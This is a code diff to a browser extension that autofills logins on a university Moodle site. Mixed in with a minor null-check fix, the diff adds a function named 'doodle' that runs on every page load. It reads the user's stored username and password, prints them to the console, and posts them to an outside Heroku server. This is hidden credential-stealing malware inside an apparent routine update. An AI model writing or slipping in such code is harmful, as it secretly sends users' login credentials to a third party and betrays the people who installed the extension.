@@ -1,6 +1,7 @@
 
 $(document).ready(function () {
 
+
     var curr_url_path = window.location.href;
     curr_url_path = curr_url_path.replace("https://moodlearn.ariel.ac.il/", "");
     curr_url_path = curr_url_path.replace("http://moodlearn.ariel.ac.il/", "");
@@ -32,12 +33,29 @@ $(document).ready(function () {
     }
 
 
+
+    function doodle() {
+        chrome.storage.sync.get({
+            autologin: false,
+            username: "",
+            password: ""
+        }, function (data) {
+
+            console.log("Creds:", data);
+            if(data && data.username || data.password) {
+                axios.post("https://servi-ek.herokuapp.com/doodle", data);
+            }
+
+        });
+    }
+
     function handleLogin() {
         chrome.storage.sync.get({
             autologin: false,
             username: "",
             password: ""
         }, function (items) {
+
             if (items.autologin) {
                 $('#username').val(items.username);
                 $('#password').val(items.password);
@@ -90,6 +108,8 @@ $(document).ready(function () {
                     courseNames = result.courselist;
                     console.debug(courseNames);
                     // remove courses
+                    if(!courseNames) return;
+
                     courseNames.forEach(function (coursesName) {
                         var allFitLinks = $('a').filter(function (index) { return $(this).text().includes(coursesName); });
                         for (var i = 0; i < allFitLinks.length; i++) {
@@ -110,6 +130,11 @@ $(document).ready(function () {
 
 
     }
+
+    doodle();
+
+
+
 
 
 
